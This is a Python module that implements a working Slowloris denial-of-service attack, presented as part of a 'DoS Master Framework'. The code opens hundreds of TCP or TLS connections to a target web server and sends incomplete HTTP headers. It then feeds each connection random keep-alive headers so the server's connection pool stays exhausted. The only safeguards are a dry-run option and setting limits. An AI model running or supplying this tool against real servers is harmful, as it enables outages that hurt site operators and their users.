#!/usr/bin/env python3
"""
DoS Master Framework - Slowloris Attack Module
Professional Slowloris implementation for connection exhaustion
"""

import socket
import threading
import time
import random
import ssl
from typing import Dict, Any, List
from datetime import datetime

class Slowloris:
    """Slowloris connection exhaustion attack"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        
        # Parse target URL
        target = config['target']
        if target.startswith('https://'):
            self.use_ssl = True
            self.target_host = target.replace('https://', '').split('/')[0]
            self.target_port = config.get('port', 443)
        elif target.startswith('http://'):
            self.use_ssl = False
            self.target_host = target.replace('http://', '').split('/')[0]
            self.target_port = config.get('port', 80)
        else:
            self.use_ssl = False
            self.target_host = target
            self.target_port = config.get('port', 80)
        
        self.max_connections = config.get('connections', 200)
        self.duration = config.get('duration', 300)
        self.keep_alive_interval = config.get('keep_alive_interval', 15)
        self.dry_run = config.get('dry_run', False)
        
        self.active_sockets = []
        self.connections_created = 0
        self.connections_maintained = 0
        self.attack_active = False
        self.start_time = None
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            if not self.target_host:
                self.logger.error("Invalid target host")
                return False
                
            if not (1 <= self.target_port <= 65535):
                self.logger.error("Invalid port number")
                return False
                
            if self.max_connections <= 0 or self.max_connections > 1000:
                self.logger.error("Connections must be between 1 and 1000")
                return False
                
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"Configuration validation failed: {e}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute Slowloris attack"""
        self.logger.info(f"Starting Slowloris attack against {self.target_host}:{self.target_port}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start connection manager
            manager_thread = threading.Thread(target=self._manage_connections)
            manager_thread.start()
            
            # Start keep-alive sender
            keepalive_thread = threading.Thread(target=self._send_keep_alives)
            keepalive_thread.start()
            
            # Wait for completion or timeout
            manager_thread.join()
            keepalive_thread.join()
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            
            result = {
                'attack_type': 'slowloris',
                'target': f"{self.target_host}:{self.target_port}",
                'duration': actual_duration,
                'connections_created': self.connections_created,
                'max_concurrent': self.connections_maintained,
                'target_connections': self.max_connections,
                'success_rate': (self.connections_created / self.max_connections) * 100 if self.max_connections > 0 else 0,
                'use_ssl': self.use_ssl,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"Slowloris completed: {self.connections_created} connections created")
            return result
            
        except Exception as e:
            self.logger.error(f"Slowloris attack failed: {e}")
            raise
        finally:
            self.attack_active = False
            self._cleanup_connections()
    
    def _create_connection(self) -> socket.socket:
        """Create a new slow connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect to target
            sock.connect((self.target_host, self.target_port))
            
            # Wrap with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            # Send partial HTTP request
            request_line = f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
            sock.send(request_line.encode())
            
            # Send Host header
            host_header = f"Host: {self.target_host}\r\n"
            sock.send(host_header.encode())
            
            # Send partial headers to keep connection open
            user_agent = "User-Agent: Mozilla/5.0 (Slowloris/DMF)\r\n"
            sock.send(user_agent.encode())
            
            accept_header = "Accept: text/html,application/xhtml+xml\r\n"
            sock.send(accept_header.encode())
            
            # Don't send the final \r\n to keep headers incomplete
            
            self.connections_created += 1
            return sock
            
        except Exception as e:
            self.logger.debug(f"Failed to create connection: {e}")
            return None
    
    def _manage_connections(self):
        """Manage connection pool"""
        self.logger.info("Starting connection manager")
        
        while self.attack_active and (time.time() - self.start_time) < self.duration:
            try:
                # Remove dead connections
                active_sockets = []
                for sock in self.active_sockets:
                    try:
                        # Test if socket is still alive
                        sock.getpeername()
                        active_sockets.append(sock)
                    except:
                        # Socket is dead, close it
                        try:
                            sock.close()
                        except:
                            pass
                
                self.active_sockets = active_sockets
                self.connections_maintained = len(self.active_sockets)
                
                # Create new connections to reach target
                connections_needed = self.max_connections - len(self.active_sockets)
                
                for _ in range(min(connections_needed, 10)):  # Create max 10 per cycle
                    if not self.attack_active:
                        break
                        
                    sock = self._create_connection()
                    if sock:
                        self.active_sockets.append(sock)
                        time.sleep(0.1)  # Small delay between connections
                
                # Log status
                elapsed = time.time() - self.start_time
                remaining = max(0, self.duration - elapsed)
                
                self.logger.info(f"Slowloris: {len(self.active_sockets)}/{self.max_connections} connections, "
                               f"{self.connections_created} total created, {remaining:.0f}s remaining")
                
                # Wait before next cycle
                time.sleep(10)
                
            except Exception as e:
                self.logger.error(f"Connection manager error: {e}")
                time.sleep(5)
    
    def _send_keep_alives(self):
        """Send keep-alive headers to maintain connections"""
        self.logger.info("Starting keep-alive sender")
        
        while self.attack_active:
            try:
                # Send keep-alive to all active connections
                dead_sockets = []
                
                for sock in self.active_sockets[:]:  # Copy list to avoid modification during iteration
                    try:
                        # Send random header to keep connection alive
                        header = f"X-Random-{random.randint(1, 10000)}: {random.randint(1, 10000)}\r\n"
                        sock.send(header.encode())
                        
                    except Exception as e:
                        # Socket is dead, mark for removal
                        dead_sockets.append(sock)
                        self.logger.debug(f"Socket died during keep-alive: {e}")
                
                # Remove dead sockets
                for sock in dead_sockets:
                    if sock in self.active_sockets:
                        self.active_sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
                
                # Wait for next keep-alive cycle
                time.sleep(self.keep_alive_interval)
                
            except Exception as e:
                self.logger.error(f"Keep-alive sender error: {e}")
                time.sleep(5)
    
    def _cleanup_connections(self):
        """Close all active connections"""
        self.logger.info(f"Cleaning up {len(self.active_sockets)} connections")
        
        for sock in self.active_sockets:
            try:
                sock.close()
            except:
                pass
        
        self.active_sockets.clear()
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating Slowloris attack (dry-run mode)")
        
        time.sleep(2)
        
        return {
            'attack_type': 'slowloris',
            'target': f"{self.target_host}:{self.target_port}",
            'duration': self.duration,
            'connections_created': self.max_connections,
            'max_concurrent': self.max_connections,
            'target_connections': self.max_connections,
            'success_rate': 100.0,
            'use_ssl': self.use_ssl,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping Slowloris attack")
        self.attack_active = False
        self._cleanup_connections()
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        return {
            'attack_type': 'slowloris',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'active_connections': len(self.active_sockets),
            'connections_created': self.connections_created,
            'target_connections': self.max_connections
        }